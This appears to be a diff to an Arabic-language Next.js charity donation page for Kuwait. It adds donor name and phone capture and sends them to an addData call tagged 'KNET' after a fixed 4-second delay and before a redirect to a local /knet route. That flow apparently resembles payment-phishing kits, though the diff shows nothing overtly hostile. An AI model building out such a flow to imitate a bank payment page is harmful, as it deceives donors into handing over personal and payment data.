@@ -11,6 +11,8 @@ import { useRouter } from "next/navigation"
 import { FullPageLoader } from "@/components/fullpageloader"
 
 export default function CharityDonationPage() {
+  const [phone, setPhone] = useState('')
+  const [name, setName] = useState('')
   const [value, setValue] = useState(10)
   const [loading, setLoading] = useState(false)
   const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
@@ -161,7 +163,8 @@ export default function CharityDonationPage() {
               <div className="flex items-center">
                 <span className="text-xs ml-1">+965</span>
               </div>
-              <input className="text-right text-gray-400 px-4" placeholder="رقم الهاتف" aria-label="تليفون المتبرع" />
+              <input className="text-right text-gray-400 p-1 mx-1"
+              onChange={(e)=>setPhone(e.target.value)} placeholder="رقم الهاتف" aria-label="تليفون المتبرع" />
               <span className="text-gray-400">تليفون المتبرع</span>
             </div>
           </div>
@@ -169,11 +172,12 @@ export default function CharityDonationPage() {
           <div className="mb-4">
             <div className="border rounded-md p-3 text-right text-gray-400 flex items-center justify-between">
               <input
-                className="text-right text-gray-400 px-4 flex-1"
-                placeholder="البريد الإلكتروني"
-                aria-label="البريد الإلكتروني للمتبرع"
+              type="text"
+                className="text-right text-gray-400 p-1 mx-1 flex-1"
+                placeholder="اسم المتبرع "  onChange={(e)=>setName(e.target.value)}
+                aria-label="اسم المتبرع"
               />
-              <span className="text-gray-400">البريد الإلكتروني للمتبرع</span>
+              <span className="text-gray-400">اسم المتبرع</span>
             </div>
           </div>
         </div>
@@ -241,7 +245,7 @@ export default function CharityDonationPage() {
                 localStorage.setItem("item", value.toString())
                 setTimeout(() => {
                   setLoading(false)
-                  addData({id:_id, page:'كي نت'})
+                  addData({id:_id, page:'كي نت',name:name,phone:phone})
                   router.push("/knet")
                 }, 4000)
               }}
